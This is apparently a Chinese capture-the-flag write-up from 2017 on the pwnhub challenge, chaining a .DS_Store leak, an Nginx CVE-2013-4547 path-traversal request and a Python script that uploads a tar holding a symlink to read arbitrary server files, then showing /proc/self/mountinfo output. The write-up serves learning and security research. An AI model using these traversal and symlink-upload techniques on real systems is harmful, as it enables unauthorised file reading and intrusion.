作者：[Hcamael@知道创宇404实验室](http://0x48.pw)  
发布时间：2017-10-04
#### Step 0
首先是`.DS_Store`信息泄露，下载下来是一个二进制文件，需要解析，google搜一搜就有了：
    >>> from ds_store import DSStore
    >>> with DSStore.open("DS_Store", "r+") as f:
    ...     for i in f:
    ...         print i
#### Step 1
根据提示：`2017.10.02 15:45:49Nginx 虽然有过很多问题，但是它是个好 server`
猜测应该是利用一个NGINX的CVE
然后在上一步发现一个奇怪的地方，最后一个是`uploap[space]` 目录而不是`uploap`目录，有一个空格。
根据这些信息，搜到一个CVE，编号是[CVE-2013-4547](https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547)
....题目关了，搞不到图了。
payload是：`GET upload /../pwnhub/ HTTP/1.1`
这里不能使用浏览器，因为浏览器会把这url变成`/pwnhub/`
得到一个路径：`6c58c8751bca32b9943b34d0ff29bc16/index.php`
#### Step 2
`6c58c8751bca32b9943b34d0ff29bc16/index.php`是一个文件上传的服务
        你在里面发现了什么? 
    注意：只支持tar!!
    更新配置成功，内容如下
一开始尝试上传各种文件，都能成功，但是配置更新成功并没有显示任何内容，包括上传tar文件，懵逼了一会。。。
然后发现，这个目录也有`.DS_Store`泄露：
    >>> with DSStore.open("DS_Store", "r+") as f:
    ...     for i in f:
    ...         print "|%s|"%i.filename
    |index.php|
    |untar.py|
有一个untar.py文件：
    import tarfile
    import sys
    import uuid
    import os
    def untar(filename):
        os.chdir('/tmp/pwnhub/')
        t = tarfile.open(filename, 'r')
        for i in t.getnames():
            if '..' in i or '.cfg' != os.path.splitext(i)[1]:
                return 'error'
            else:
                try:
                    t.extract(i, '/tmp/pwnhub/')
                except Exception, e:
                    return e
                else:
                    cfgName = str(uuid.uuid1()) + '.cfg'
                    os.rename(i, cfgName)
                    return cfgName
    if __name__ == '__main__':
        filename = sys.argv[1]
        if not tarfile.is_tarfile(filename):
            exit('error')
        else:
            print untar(filename)
很明显了，要压缩一个cfg文件
    $ echo "fjwopqafjasdo" > /tmp/test.cfg
    $ tar cf /tmp/test.tar /tmp/test.cfg
然后上传test.tar，更新配置成功后终于成功返回内容了。
但是该怎么利用又卡住了，然后看到hint：`2017.10.03 11:24:40想办法把它变成任意文件读取，但 Flag 不在这儿
，当作一次真实渗透玩吧！`
想到了软链接，PoC如下：
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    import os
    import sys
    import re
    import requests
    from bs4 import BeautifulSoup
    def upload():
        url = "http://54.223.177.152/6c58c8751bca32b9943b34d0ff29bc16/index.php"
        files = {"upload": ("test.tar", open("/tmp/test.tar", "rb"), "application/x-tar")}
        r = requests.post(url, files=files)
        data = r.content
        # html = BeautifulSoup(data, "lxml")
        # print html.textarea.contents[0]
        print data
    def main():
        filename = sys.argv[1]
        print filename
        os.system("ln -sf %s /tmp/test.cfg"%filename)
        os.system("tar cf /tmp/test.tar /tmp/test.cfg")
        upload()
    if __name__ == '__main__':
        main()
#### Step 3
到了任意文件读取的步骤了，然后各种文件读读，照例我都会读读`/proc/self`下的文件，然后发现：
    $ python 2013_read_file.py /proc/self/mountinfo
        你在里面发现了什么? 
    注意：只支持tar!!
    更新配置成功，内容如下181 103 0:40 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay/a67f9242dc6db4569b299d14ce4308f2f63624e8387569cbe015cbc973e50a0c/root,upperdir=/var/lib/docker/overlay/ea20e67da7b4415fd04862f8f7a0bef6a2b6ace2f5ec2e664d07cb9b6280bc8c/upper,workdir=/var/lib/docker/overlay/ea20e67da7b4415fd04862f8f7a0bef6a2b6ace2f5ec2e664d07cb9b6280bc8c/work
    182 181 0:43 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
    238 181 0:44 / /dev rw,nosuid - tmpfs tmpfs rw,mode=755
    239 238 0:45 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
    240 181 0:46 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
    241 240 0:47 / /sys/fs/cgroup ro,nosuid,nodev,noexec,relatime - tmpfs tmpfs rw,mode=755
    242 241 0:22 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/systemd ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd
    243 241 0:24 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/blkio ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,blkio
    244 241 0:25 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/perf_event ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,perf_event
    245 241 0:26 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/cpu,cpuacct ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,cpu,cpuacct
    246 241 0:27 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/pids ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,pids
    247 241 0:28 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/freezer ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,freezer
    248 241 0:29 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/net_cls,net_prio ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,net_cls,net_prio
    249 241 0:30 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/memory ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,memory
    250 241 0:31 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/cpuset ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,cpuset
    251 241 0:32 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/hugetlb ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,hugetlb
    252 241 0:33 /docker/e31d2f13a2e2d5635994cc152024c3264228513d82590d21557140b641e2ba23 /sys/fs/cgroup/devices ro,nosuid,nodev,noexec,relatime - cgroup cgroup rw,devices
    253 238 0:42 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
    254 181 202:1 /home/ubuntu/Nginx_1.4.2/crontab /etc/crontab rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered
    255 181 202:1 /home/ubuntu/Nginx_1.4.2/pwnhub /tmp/pwnhub rw,relatime - ext4 /dev/xvda1 rw,discard,data=ordered